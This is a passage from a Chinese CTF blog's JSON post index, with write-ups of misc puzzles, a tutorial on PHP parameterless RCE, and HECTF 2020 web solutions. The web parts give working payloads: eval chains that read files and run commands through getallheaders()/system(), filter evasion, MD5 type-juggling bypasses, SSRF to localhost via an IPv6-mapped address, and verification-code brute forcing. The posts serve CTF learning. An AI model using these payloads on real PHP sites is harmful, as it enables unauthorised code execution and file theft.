访问IP即可看到博客了，至此博客搭建完成","categories":[{"name":"Notes","slug":"Notes","permalink":"https://flag2020.top/categories/Notes/"}],"tags":[{"name":"搭建博客","slug":"搭建博客","permalink":"https://flag2020.top/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"}]},{"title":"复现3道misc题","slug":"复现3道misc题","date":"2020-12-21T16:00:00.000Z","updated":"2021-04-09T15:18:53.365Z","comments":true,"path":"posts/20201222.html","link":"20201222","permalink":"https://flag2020.top/posts/20201222.html","excerpt":"CISCN2020 &amp; 安洵杯2019 &amp; SWPUCTF2020","text":"CISCN2020 &amp; 安洵杯2019 &amp; SWPUCTF2020 目录 CISCN 2020 复赛(华南赛区) —— hidden_secret 安洵杯 2019 —— easy misc SWPUCTF 2020 —— 耗子尾汁 hidden_secret题目：CISCN 2020 复赛（华南赛区） 参考：CISCN 复赛(华南赛区)部分wp - 迷失的老鼠 - 博客园 (cnblogs.com) 文件：flag1.zip flag1.zip解压出来是一张图片（hahah.jpg）和一个压缩包（hidden_secret.zip） 图片好像没什么东西，压缩包解密需要密码 打开hidden_secret.zip，发现加密的文件里面也有hahah.jpg，而且crc校验值一样 用ARCHPR进行明文攻击 拿到了hidden_secret.zip的解压密码： pb-1&#96;;ks 解压后又是那个狗头，还有个hidden_secret.rar，继续解压 得到key.gif 中途看到有一帧有二维码 用PS打开，在图层34查看图层 扫码得到： flag&#123;ni_chou_sha&#125; 提交后发现不对😡 用stegsolve分析图像信息，可以发现这个gif动图的间隔时间分为10和20两种，考虑gif时间隐写 将所有间隔时间分离出来 identify -format &quot;%T&quot; key.gif 得到 1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010 将10转化为0，20转化为1 &lt;?php $a = \"1020201020201020102010101020101010102020102010201020102020202020102020101020201010202020101020201020202010201010\"; $a = str_replace('10', '0', $a); $a = str_replace('20', '1', $a); echo $a; ?> 得到 01101101010001000011010101011111011001100111001101110100 将二进制转为字符串，得到 mD5_fst md5加密后得到 046cb65e60a4774c76b4f99371e66f0d 根据题目提示ntfs，查看文件夹隐藏文件，在hidden_secret文件夹中发现隐藏文件 导出后重命名为1.rar 解压密码为上面的MD5 解压得到flag.txt flag&#123;f935c5d0470757a3d2f3ee7467366f4e&#125; easy misc题目：安洵杯 2019 参考：BUUCTF:[安洵杯 2019]easy misc_F10NA-CSDN博客 文件：attachment.rar 解压之后有三个文件（夹） decode.zip为加密文件，但有注释 FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL, 算出来是7 &lt;?php echo (sqrt(2524921)*85/5+2)/15-1794; ?> 使用掩码攻击 2019456NNULLULL, 解压后得到decode.txt，确认为字频隐写 a &#x3D; dIW b &#x3D; sSD c &#x3D; adE d &#x3D; jVf e &#x3D; QW8 f &#x3D; SA&#x3D; g &#x3D; jBt h &#x3D; 5RE i &#x3D; tRQ j &#x3D; SPA k &#x3D; 8DS l &#x3D; XiE m &#x3D; S8S n &#x3D; MkF o &#x3D; T9p p &#x3D; PS5 q &#x3D; E&#x2F;S r &#x3D; -sd s &#x3D; SQW t &#x3D; obW u &#x3D; &#x2F;WS v &#x3D; SD9 w &#x3D; cw&#x3D; x &#x3D; ASD y &#x3D; FTa z &#x3D; AE7 而在read文件夹里有大量txt文件，里面有个hint.txt hint:取前16个字符 但不知道是取哪个txt文件的前16高频字母 使用foremost分离小姐姐.png，得到 使用盲水印工具分离：盲水印合成与解密 安装不了opencv库，目前没有提取成功，据说是11.txt 对11.txt进行字频分析：http://www.aihanyu.org/cncorpus/CpsTongji.aspx 序号 字词 出现次数 出现频率 1 17203 17.4123 2 e 8938 9.0467 3 t 6278 6.3544 4 a 5849 5.9202 5 o 5372 5.4374 6 n 4932 4.992 7 r 4525 4.5801 8 h 4460 4.5143 9 s 4347 4.3999 10 i 4291 4.3432 11 d 3640 3.6843 12 l 3339 3.3796 13 u 2308 2.3361 14 y 1903 1.9262 15 g 1851 1.8735 16 w 1733 1.7541 17 c 1506 1.5243 18 m 1491 1.5091 19 . 1423 1.4403 20 f 1246 1.2612 21 1203 1.2176 22 b 1199 1.2136 23 , 1181 1.1954 24 p 1109 1.1225 25 k 931 0.9423 26 &quot; 866 0.8765 27 &#39; 710 0.7186 28 H 603 0.6103 29 v 592 0.5992 30 - 450 0.4555 31 D 352 0.3563 32 I 281 0.2844 33 T 250 0.253 34 A 197 0.1994 35 P 194 0.1964 36 M 182 0.1842 37 ? 152 0.1538 38 S 131 0.1326 39 W 124 0.1255 40 V 119 0.1204 41 U 117 0.1184 42 O 106 0.1073 43 ! 96 0.0972 44 G 80 0.081 45 E 76 0.0769 46 x 76 0.0769 47 B 74 0.0749 48 j 74 0.0749 49 Y 73 0.0739 50 z 73 0.0739 51 N 72 0.0729 52 C 61 0.0617 53 R 56 0.0567 54 L 55 0.0557 55 F 53 0.0536 56 q 49 0.0496 57 ; 32 0.0324 58 K 30 0.0304 59 : 22 0.0223 60 ( 14 0.0142 61 ) 14 0.0142 62 J 13 0.0132 63 1 5 0.0051 64 3 3 0.003 65 4 3 0.003 66 Q 3 0.003 67 2 2 0.002 68 Z 2 0.002 69 ~ 1 0.001 70 0 1 0.001 71 7 1 0.001 也可以使用脚本进行字频分析 import re file = open('E:/11.txt') line = file.readlines() file.seek(0,0) file.close() result = &#123;&#125; for i in range(97,123): count = 0 for j in line: find_line = re.findall(chr(i),j) count += len(find_line) result[chr(i)] = count res = sorted(result.items(),key=lambda item:item[1],reverse=True) num = 1 for x in res: print('频数第&#123;0&#125;: '.format(num),x) num += 1 前16高频字符为 etaonrhsidluygw QW8obWdIWT9pMkF-sd5RESQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D; 编码后缀符号为=，猜测是base64 但标准base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号，并没有r=-sd的-，查了下发现题目出错了 所以是 QW8obWdIWT9pMkFSQWtRQjVfXiE&#x2F;WSFTajBtcw&#x3D; base64解码后得到 Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms base85解码后得到 flag&#123;have_a_good_day1&#125; 耗子尾汁题目：SWPUCTF 2020 参考：SWPUCTF2020 Misc题解 文件：hzwz.gif binwalk提取一下，得到4个文件 flag.txt没有flag flag&#123;Th1s_1s_fa1se_f1ag&#125; 上来就分离我合成的gif 这好吗？这不好！ 啪的一下 很快啊 我全都防住了 2^4_2^5_2^6.mp4为闪电五连鞭的视频，中间有一帧画面有东西 63E3A.zip和63F5F.zip解压出来就是2^4_2^5_2^6.mp4 c2lnbl9pbg&#x3D;&#x3D; base64解码为 sign_in 把2^4_2^5_2^6.mp4拖到010editor，发现文件尾有个PK开头的压缩包，复制另存为1.zip 也可以用kali自带的binwalk提取 解压需要密码，将sign_in作为密码，解压得到19_20.txt R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D; &#x2F;&#x2F;The last layer is the single table replacement password 翻译：最后一层是单表替换密码 base64解码得到 GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D; base32解码 6C76756569616B7875647379716568737A7168796B67677379796C6B767669 十六进制转字符 lvueiakxudsyqehszqhykggsyylkvvi 19_20.txt说最后一层是单表替换密码，而仿射密码是一种表单代换密码 根据文件名，设a=19，b=20 使用脚本进行仿射密码解密 s = \"lvueiakxudsyqehszqhykggsyylkvvi\".upper() a = 19 b = 20 def get(a, b): if b == 0: return 1, 0 else: k = a //b remainder = a % b x1, y1 = get(b, remainder) x, y =y1, x1 - k * y1 return x, y x, y = get(a, 26) a1 = x % 26 l= len(s) for i in range(l): cipher = a1 * (ord(s[i])- 65 - b) % 26 res=chr(cipher + 65) print(res.lower(), end='') 得到 flagyouhavesignedinsuccessfully 根据题目提示：flag格式flag{xxx_xxxx_xxxxxx_xx_xxxxxxxxxxxx} 加上下划线，得到flag flag&#123;you_have_signed_in_successfully&#125; 附： 仿射密码解密原始脚本：仿射密码解密（Affine Cipher） #仿射密码解密 #改进欧几里得算法求线性方程的x与y def get(a, b): if b == 0: return 1, 0 else: k = a //b remainder = a % b x1, y1 = get(b, remainder) x, y =y1, x1 - k * y1 return x, y s = input(\"请输入解密字符：\").upper() a = int(input(\"请输入a：\")) b = int(input(\"请输入b：\")) #求a关于26的乘法逆元 x, y = get(a, 26) a1 = x % 26 l= len(s) for i in range(l): cipher = a1 * (ord(s[i])- 65 - b) % 26 res=chr(cipher + 65) print(res, end='')","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://flag2020.top/tags/misc/"}]},{"title":"无参数RCE","slug":"无参数RCE","date":"2020-12-02T16:00:00.000Z","updated":"2021-04-09T14:50:17.236Z","comments":true,"path":"posts/20201203.html","link":"20201203","permalink":"https://flag2020.top/posts/20201203.html","excerpt":"无参数RCE：只使用函数，且函数不能带有参数","text":"无参数RCE：只使用函数，且函数不能带有参数 代码分析&lt;?php highlight_file(__FILE__); if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']); &#125; ?> preg_replace() 语法： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) pattern：要搜索的模式，可以是字符串或一个字符串数组 replacement：用于替换的字符串或字符串数组 subject：要搜索替换的目标字符串或字符串数组 limit：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制） count：可选，为替换执行的次数 简化为： preg_replace(pattern, replacement, subject) 即：将subject中符合pattern的替换为replacement 对于preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;]) 意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串 正则表达式正则表达式（Regular Expression）描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。 正则表达式 – 语法 | 菜鸟教程 (runoob.com) &lt;?php $str='01ABcdEf_230G'; echo preg_replace('/0/', 'A', $str).'&lt;br>'; //将0换成A echo preg_replace('/[0-9]/', '', $str).'&lt;br>'; //去掉所有数字 echo preg_replace('/[a-z]/', '', $str).'&lt;br>'; //去掉所有小写字母 echo preg_replace('/[A-Z]/', '', $str).'&lt;br>'; //去掉所有大写字母 echo preg_replace('/[^A-Z]/', '', $str).'&lt;br>'; //去掉除了大写字母外所有的字符 echo preg_replace('/[a-z A-Z]/', '', $str).'&lt;br>'; //去掉所有大小写字母 ?> A1ABcdEf_23AGABcdEf_G01ABE_230G01cdf_230ABEG01_230 &lt;?php $a = \"abcABC123_+-*/\"; echo preg_replace('/[\\w]/', '!', $a).\"&lt;br>\"; echo preg_replace('/[\\W]/', '!', $a).\"&lt;hr>\"; echo preg_replace('/[^\\W]/', '!', $a).\"&lt;br>\"; ?> !!!!!!!!!!+-/abcABC123_!!!!!!!!!!!!!!+-/ \\w：匹配字母、数字、下划线。等价于[A-Z a-z 0-9 _] \\W：匹配非字母、数字、下划线。等价于[^A-Z a-z 0-9 _] 而(?R)是引用当前表达式的意思，即可以用/[^\\W]+\\((?R)?\\)/替换到(?R)的位置 (?R)? 这里多一个?表示可以有引用，也就是说可以衍生匹配。 即：(?R)?表示递归整个匹配模式 所以/[^\\W]+\\((?R)?\\)/合起来就是匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配字符串+()的类型，并且括号内为空字符串或字符串+()。 总结所以对于preg_replace(&#39;/[^\\W]+\\((?R)?\\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;]) 像fun1(fun2(fun3()))最终会被替换为空 而fun1(fun2(fun3(aaa)))则不会进行替换，结果仍为fun1(fun2(fun3(aaa))) 常用函数show_source()扩展：highlight_file() 高亮读取文件 show_source()函数对文件进行语法高亮提示 show_source(filename,return) 参数 描述 filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码。 test.php &lt;?php echo __FILE__.'&lt;br>'; show_source(__FILE__).\"&lt;hr>\"; ?> localeconv()localeconv() 函数返回一包含本地数字及货币格式信息的数组，且第一个元素为点（.)。 localeconv() 函数会返回以下数组元素： [decimal_point] - 小数点字符 [thousands_sep] - 千位分隔符 [int_curr_symbol] - 货币符号 （例如：USD） [currency_symbol] - 货币符号 （例如：$） [mon_decimal_point] - 货币小数点字符 [mon_thousands_sep] - 货币千位分隔符 [positive_sign] - 正值字符 [negative_sign] - 负值字符 [int_frac_digits] - 国际通用小数位 [frac_digits] - 本地通用小数位 &lt;?php var_dump(localeconv()); ?> array(18) { [“decimal_point”]=&gt; string(1) “.” [“thousands_sep”]=&gt; string(0) “” [“int_curr_symbol”]=&gt; string(0) “” [“currency_symbol”]=&gt; string(0) “” [“mon_decimal_point”]=&gt; string(0) “” [“mon_thousands_sep”]=&gt; string(0) “” [“positive_sign”]=&gt; string(0) “” [“negative_sign”]=&gt; string(0) “” [“int_frac_digits”]=&gt; int(127) [“frac_digits”]=&gt; int(127) [“p_cs_precedes”]=&gt; int(127) [“p_sep_by_space”]=&gt; int(127) [“n_cs_precedes”]=&gt; int(127) [“n_sep_by_space”]=&gt; int(127) [“p_sign_posn”]=&gt; int(127) [“n_sign_posn”]=&gt; int(127) [“grouping”]=&gt; array(0) { } [“mon_grouping”]=&gt; array(0) { }} pos()pos() 函数返回数组中的当前元素的值（取第一个元素）。 该函数是 current() 函数的别名。 如果pos()和current()都被过滤了，可以使用reset()。 每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。 相关的方法： current() - 返回数组中的当前元素的值 end() - 将内部指针指向数组中的最后一个元素，并输出 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset() - 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 scandir()scandir() 函数返回指定目录中的文件和目录的数组。 scandir(directory,sorting_order,context); 参数 描述 directory 必需。规定要扫描的目录。 sorting_order 可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。 context 可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。 &lt;?php var_dump(scandir('D:\\ant')); ?> chr()chr() 函数从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x； &lt;?php echo chr(61) . \"&lt;br>\"; // 十进制 echo chr(061) . \"&lt;br>\"; // 八进制值 echo chr(0x61) . \"&lt;br>\"; // 十六进制值 ?> =1a chdir()chdir() 函数当参数为两个点的时候能够跳转到上层目录，相当于在命令行输入cd..会返回上一级目录。 DOS的Chdir（cd）命令可以显示当前目录的名称或者更改当前的目录。 一般当前显示的路径是”C:\\Users\\Administrator”，如果想要跳转到D盘的Test文件夹(“D:\\test\\”)可以直接使用DOS命令cd /d d:\\test 如果想要跳转到当前路径的上一级路径可以直接用DOS命令cd .. 如果想要获取cd命令的具体用法，可以直接输入cd /? &lt;?php echo getcwd().\"&lt;br>\"; chdir(\"app\"); echo getcwd().\"&lt;br>\"; chdir(\"..\"); echo getcwd().\"&lt;br>\"; ?> D:\\phpStudy\\PHPTutorial\\WWWD:\\phpStudy\\PHPTutorial\\WWW\\appD:\\phpStudy\\PHPTutorial\\WWW localtime()localtime(timestamp,is_assoc); 参数 描述 timestamp 可选。规定 Unix 时间戳。如果未规定 timestamp，则默认为当前的本地时间 time()。 is_assoc 可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效 例子&lt;?php if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']); &#125; else &#123; show_source(__FILE__); &#125; ?> 方法一可以利用eval()读取目录 用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配 &lt;?php var_dump(scandir('.')); ?> 用pos()取localeconv()返回的数组的第一个元素，也就是”.” &lt;?php var_dump(scandir(pos(localeconv()))); ?> code.php?code=var_dump(scandir(pos(localeconv()))); 用end()选择最后一个文件并用readfile()读取 code.php?code=var_dump(readfile(end(scandir(pos(localeconv()))))); readfile() 输出一个文件 show_source() 与 echo(readfile())效果一样，可代替使用。 方法二利用当前秒数构造点 ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之内，我们只需等到46秒时候就能将点给构造出来。 chr(current(localtime(time()))) 利用chr(46)就是字符. 数组第一个值每秒+1，所以最多60秒就一定能得到46 var_dump(chr(pos(localtime()))); 最终payload http:&#x2F;&#x2F;39.107.126.173:8080&#x2F;code&#x2F;code.php? code&#x3D;var_dump(readfile(end(scandir(chr(pos(localtime())))))); 方法三利用SESSIONID来传参 show_source(session_id(session_start())); 在cookie处传参 PHPSESSID&#x3D;flag.php 方法四利用 getallheaders() 来获取参数RCE echo(system(end(getallheaders()))); 在最后在最后一条请求头添加 cat flag.php 读取目录文件 如果文件是最后一个，可以用 show_source(end(scandir(getcwd()))); 或者用readfile()、highlight_file()、file_get_contents()、readgzfile()等读文件函数 如果文件是倒数第二个，可以用 show_source(next(array_reverse(scandir(getcwd())))); array_reverse()以相反的元素顺序返回数组 如果不是数组的最后一个或者倒数第二个，可以用 show_source(array_rand(array_flip(scandir(getcwd())))); 或者： show_source(array_rand(array_flip(scandir(current(localeconv()))))); array_flip()函数会交换数组的键名和键值，array_rand()函数会返回数组中的随机键名 跳转目录情况 假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 chdir() 函数当参数为两个点的时候能够跳转到上层目录。scandir() ，读取当前目录在第二个元素就能读取两个点 localtime第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳 构造读取上层目录payload echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))); 构造读取上层目录文件payload echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 其它小技巧 利用chr(46)就是字符. phpversion()会返回php版本，如5.6.27 floor(phpversion())返回5 sqrt(floor(phpversion()))返回2.2360679774998 tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615 cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491 sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156 ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46 即：chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))等于. 利用三角函数构造斜杠 chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))); 利用随机令牌构造点 echo(implode(scandir(chr(strrev(uniqid()))))); 查看上一级目录文件名 print_r(scandir(dirname(getcwd()))); print_r(scandir(next(scandir(getcwd())))); 题目&lt;?php //flag in flag.php $a=\"\"; if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; if(preg_match(\"/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/i\", $_GET['code']))&#123; die(\"no no no !\"); &#125; eval(\"\\$a=\".$_GET['code']); if(preg_match('/flag/', $a))&#123; die(\"no\"); &#125; echo($a); &#125; else &#123; show_source(__FILE__); &#125; ?> 代码分析首先对传进来的code进行过滤，若是通过替换后为;，则能通过第一个if判断语句，所以要套娃嵌套 第二个if语句对危险函数进行过滤，包括大小写，所以只能用没被过滤的函数来构造payload eval()语句执行传进来的code，然后赋值给$a 第三个if语句对$a进行匹配，如果含有flag，则die掉 绕过了前面3个if语句，则通过echo($a)，将code执行后的结果输出 构造payload用file_get_contents()将整个文件读入一个字符串，利用eval()赋值给$a，最后通过echo()打印出来 因为不知道flag.php的位置，且过滤掉很多函数，如：end()、next()等 所以用array_rand(array_flip())来获取一个随机的文件名 合起来就是 file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))); 但后边对$a进行正则匹配，过滤了flag，所以要对读取的文件内容加密，由于过滤了base64，所以选择用十六进制加密，得到最终payload bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv())))))); 因为是随机读取，所以要多刷新几次，然后解密看看 &lt;?php echo hex2bin(\"3c3f7068700d0a2f2f666c61677b36643633333362392d353564302d343266312d613236642d3663666439663361666238657d0d0a3f3e\");","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"第四届HECTF write up","slug":"第四届HECTF write up","date":"2020-11-21T16:00:00.000Z","updated":"2021-04-09T14:02:00.968Z","comments":true,"path":"posts/20201122.html","link":"20201122","permalink":"https://flag2020.top/posts/20201122.html","excerpt":"web &amp; misc &amp; 复现","text":"web &amp; misc &amp; 复现 Webezphp题目：蛾子！你怎么跑到了。。。。php上？ &lt;?php error_reporting(0); highlight_file(__file__); include('flag.php'); $string_1 = $_GET['str1']; $string_2 = $_GET['str2']; if($_GET['param1']!==$_GET['param2']&amp;&amp;md5($_GET['param1'])===md5($_GET['param2']))&#123; if(is_numeric($string_1))&#123; $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2)&#123; $a = strtr($md5_1, 'cxhp', '0123'); $b = strtr($md5_2, 'cxhp', '0123'); if($a == $b)&#123; echo $flag; &#125; else &#123; die('you are close'); &#125; &#125; else &#123; die(\"md5 is wrong\"); &#125; &#125; else &#123; die('str1 not number'); &#125; &#125; else &#123; die('you are wrong!'); &#125; ?> 利用md5()不能加密数组，加密数组会返回false，所以param1和param2传值为 param1[]&#x3D;1&amp;param2[]&#x3D;2 接下要使得传进来的str1是纯数字，且str1和str2进行md5加密后的值不相等 然后对md5加密后的值进行替换后相等，最终得到flag 只要是以0e开头，后面为数字的两个字符串相等，所以 $a == $b这里可以考虑这样绕过 纯数字的字符串md5加密后符合**0e\\d+**的有240610708，即 str1&#x3D;240610708 因为在后面的替换中，会将c替换为0，所以str2进行md5加密后得以ce开头，这样才能使得str1和str2md5加密后的值不相等，替换后又能相等 而str2进行md5加密后，除开头的ce外，剩下部分只能是数字和字母cxhp 写脚本进行筛选 &lt;?php for ($i=0; $i&lt;10000000; $i++) &#123; $a = md5($i); if(substr($a, 0, 2) == 'ce') &#123; $end = substr($a, 2); if(!preg_match('/[^0-9cxhp]/', $end)) &#123; echo \"i=\".$i.'&lt;br>'; echo \"a=\".$a.'&lt;br>'; &#125; &#125; &#125; i&#x3D;9427417 a&#x3D;ce156443c7c7c4c63366466c25317636 所以str2=9427417 联合起来即 ?str1&#x3D;240610708&amp;str2&#x3D;9427417&amp;param1[]&#x3D;1&amp;param2[]&#x3D;2 签到题目：登录就送flag~ hint：brute force 随便输个手机号和密码，提示手机或密码错误，查看源码发现手机号：15970773575 点击忘记密码，根据题目hint，使用暴力破解 用脚本生成4位纯数字的验证码 4num.py for i in range(0000,9999): s = str(i).zfill(4) with open('4num.txt',\"a\") as f: f.write(str(s) + \"\\n\") f.close() 用burp suite抓包，使用爆破模块进行爆破，其中0233的长度和其它明显不同 尝试后发现为正确的验证码，重设密码后重新登录即可拿到flag HECTF&#123;a9a102c0c06fcf6c8072c30f0a52f1f2&#125; ssrfme题目：绕过人海，走进服务器内心的世界。 &lt;?php error_reporting(0); highlight_file(__FILE__); //try flag.php function filter($url) &#123; $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) &#123; die('url fomat error'); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die('url fomat error'); return false; &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16; &#125; $url = $_GET['url']; if(!filter($url))&#123; echo file_get_contents($url); &#125; ?> 参考：【转载】浅谈ssrf与ctf那些事 | kawhi’s Blog (getflag.cn) ?url&#x3D;http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;flag.php misc【真签到题】快来看直播啦~题目：前往直播间，调戏小蓝蓝获取flag。 flag在直播屏幕里 HECTF&#123;狮虎萌轻一点打出题人好吗嘤嘤嘤&#125; png题目：好可爱的小猫咪鸭~ 下载后是一张图片：flag.png 拖到010 Editor里，在末尾发现这个 M2I3OWJkZjhmY2ZkNTVmZH0&#x3D; base64解密后得到 3b79bdf8fcfd55fd&#125; 差了前半段，尝试调整图片高度，将02 BC改为04 20 在图片最下看到前半段的flag 合起来得到flag flag&#123;94ed7fdae8f504743b79bdf8fcfd55fd&#125; 不说人话题目：阴阳怪气？！ 使用Ook编解码在线工具，得到flag HECTF&#123;TH1s_1s_crypt0_914nda0&#125; 复现参考：https://mp.weixin.qq.com/s/SWjgzRRm8-RKCRRSrLYbRw web1题目：Sunned是一个linux小白，突然有一天想学渗透，她请教了某大佬，大佬说，首先的你得先学会搭建环境，然后，然后，Sunned就跟着网上的教程先搭建了一个web服务器，搭建好之后大佬给她上了一个题目。 hint：一个小姑娘走丢了，她的家人担心地到处找，一边找一边喊：贝丝！你在哪？？ L2V0Yy9jcm9udGFi 查看源码发现 php弱类型比较问题，利用md5不能加密数组绕过 a[]&#x3D;1&amp;b[]&#x3D;2 得到： You need the file is .&#x2F;3b8cf4731c36d20776c76e20f9c774c7.php 访问该路径 &lt;html&gt; @$data&#x3D;$_POST[&#39;data&#39;]; $file&#x3D;$_POST[&#39;file&#39;]; if($file!&#x3D;&quot;&#x2F;xxx&quot;) die(&quot;你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径&quot;); if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\\W]+\\((?R)?\\)&#x2F;&#39;, &#39;&#39;, $data)) &#123; echo &quot;great!!!!你需要看看源码&quot;; file_put_contents($file,&quot;&quot;); &#125; 你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径 根据提示的L2V0Yy9jcm9udGFi，进行base64解码，得到 &#x2F;etc&#x2F;crontab 访问该路径 尝试传参，并访问 data&#x3D;phpinfo();&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php get_defined_vars() 会返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 &lt;?php var_dump(get_defined_vars()); /* array(4) &#123; [\"_GET\"]=> array(0) &#123; &#125; [\"_POST\"]=> array(0) &#123; &#125; [\"_COOKIE\"]=> array(0) &#123; &#125; [\"_FILES\"]=> array(0) &#123; &#125; &#125; */ ?> data&#x3D;eval(pos(next(get_defined_vars())));&amp;file&#x3D;&#x2F;very_g00d_Y0u_got_it.php 或： data=eval(end(current(get_defined_vars())));&amp;file=/very_g00d_Y0u_got_it.php 执行命令 Zmw0Z2dnZ2dnZ2dnZ2dnCg base64解密后为 fl4ggggggggggggCg 也可以读取3b8cf4731c36d20776c76e20f9c774c7.php，从注释知道flag所在文件 读取Zmw0Z2dnZ2dnZ2dnZ2dnCg，得到flag 3b8cf4731c36d20776c76e20f9c774c7.php 源码： &lt;html> @$data=$_POST['data']; $file=$_POST['file']; if($file!=\"/xxx\") die(\"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径\"); if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $data)) &#123; echo \"great!!!!你需要看看源码\"; file_put_contents($file,\"&lt;?php \".\\$data.\" ?>\"); &#125; &lt;?php @$data=$_POST['data']; $file=$_POST['file']; if($file!=\"/very_g00d_Y0u_got_it.php\") die(\"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径\"); if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $data)) die(\"nonono \"); if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $data)) &#123; echo \"great!!!!\"; @file_put_contents($file,\"&lt;?php \".$data.\" ?>\"); //你想要的文件是 Zmw0Z2dnZ2dnZ2dnZ2dnCg &#125; ?> &lt;/html>> 在这里签到题目：经典套娃 有手就… enc.txt U2FsdGVkX18DxoLgtTzVee++9JZw790ngjGfxdjjjeWt9m9jL2O3NJuKB&#x2F;&#x2F;4O3BHTnelg2z+o2vE0AxVKPobIFVgKxqbpkr94XYPNZFbbFykHWBMArdVT8FuH7dyvHDrLe7D35p654UEy2Yn0FepbJ7BHcn9Gu9xg7eqVcovB6KfMivcXw49JyZWbWtb0SZKpA0hRgI2tNeQ8lsRZRkoaI9CECyphItxLd0bO58phQjv70M&#x2F;e30tsFpEmPo&#x3D; rabbit解密 